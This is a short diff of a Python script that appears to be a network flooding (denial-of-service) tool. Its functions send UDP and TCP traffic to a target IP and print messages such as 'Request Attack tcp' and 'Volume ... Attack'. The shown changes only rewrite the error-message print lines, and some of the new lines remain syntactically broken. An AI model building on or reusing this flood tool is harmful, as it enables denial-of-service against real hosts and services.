@@ -76,7 +76,7 @@ def run():
 				s.sendto(data,addr)
 			print(i + "\033[32mלתקוף את פרוטוקול הנתונים של המשתמש\033[0m")
 		except:
-			print(💥 ["\033[97mError!!!\033[0m")
+			print(["-\033[97mError!!!\033[0m")
 
 
 def run2():
@@ -92,7 +92,7 @@ def run2():
                         print(i + "\033[32mRequest Attack tcp::..\033[0m")
 		except:
 			s.close()
-			print("[💥] \033[31mError!!!\033[0m")
+			print("- [\033[31mError!!!]\033[0m")
             
 
 def run3():
@@ -108,7 +108,7 @@ def run3():
 			print(i + " \033[95mSending Massage\033[0m")
 		except:
 			s.close()
-			print(💥 ["\033[31mMaybe down...!\033[0m")
+			print("[- \033[31mMaybe down...!]\033[0m")
             
   
 def run4():
@@ -124,7 +124,7 @@ def run4():
 			print(i + "\033[33mVolume " +str(u)+ " \033[94mAttack " +ip+ "\033[0m")
 		except:
 			s.close()
-			print(👽 ["\033[31mError!!!\033[0m"])
+			print(["- \033[31mError!!!]\033[0m"])
 
 
 											
